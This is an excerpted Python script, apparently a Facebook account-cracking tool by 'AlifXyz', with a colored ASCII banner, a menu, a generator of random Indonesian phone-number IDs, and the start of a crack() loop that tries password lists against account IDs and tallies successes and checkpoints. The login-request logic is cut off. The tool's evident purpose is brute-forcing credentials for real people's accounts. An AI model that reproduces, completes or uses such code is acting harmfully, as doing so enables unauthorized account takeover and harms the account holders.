...
sys.stdout.write('\x1b[1;35m\x1b]2;ꕥ💛❁AlifXyz❁💛ꕥ \x07')
...
###-------[LOGO]-----------####
logo= f'''\033[1;32m
     ALIF   ALIF ALIF   ALIF ALIFNURDIN 
      ALIF ALIF   ALIF ALIF        ALIF  
       A88o88F     A88o88F        ALIF   
\033[1;32m        Y888P       Y888P        d88P
        d888b        XYZ        ALIF\033[1;97m
       d88888b       XYZ       ALIF      
      ALIF ALIF      XYZ      ALIF       
     ALIF   ALIF     XYZ     ALIFNURDIN 
     
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] ​🇦​​🇺​​🇹​​🇭​​🇴​​🇷: Alif Nurdin Afizayen
 \033[1;97m[\033[1;92m•\033[1;97m] ​🇫​​🇦​​🇨​​🇪​​🇧​​🇴​​🇴​​🇰​:https://www.facebook.com/profile.php?id=AlifXyz78/
 \033[1;97m[\033[1;92m•\033[1;97m] ​🇬​​🇮​​🇹​​🇭​​🇺​​🇧​: https://github.com/Alif-Xyz
 \033[1;97m[\033[1;92m•\033[1;97m] ​🇻​​🇪​​🇷​​🇸​​🇮​​🇴​​🇳: \033[1;92m0.1
\033[1;97m---------------------------------------------------
'''
...
def menu():
    ...
    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \x1b[38;5;208mVISIT FACEBOOK CHANEL")
    print(f" \033[1;97m[\033[1;92m03\033[1;97m] \033[1;32mCONTACT FACEBOOK")
    linex()
    AlifXyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if AlifXyz in ['1','01']:
        random_number()
    elif AlifXyz in ['2','02']:
        time.sleep(3)
        menu()
    elif AlifXyz in ['3','03']:
    	os.system("xdg-open https://www.facebook.com/profile.php?id=AlifXyz78/");time.sleep(3);menu()
    else:
...
def random_number():
    clear()
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m082, 083, 089, 081, 085 ")
...
def crack(uid, pww, total_idz):
    ...
    sys.stdout.write(f"\r{x}[AlifXyz] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
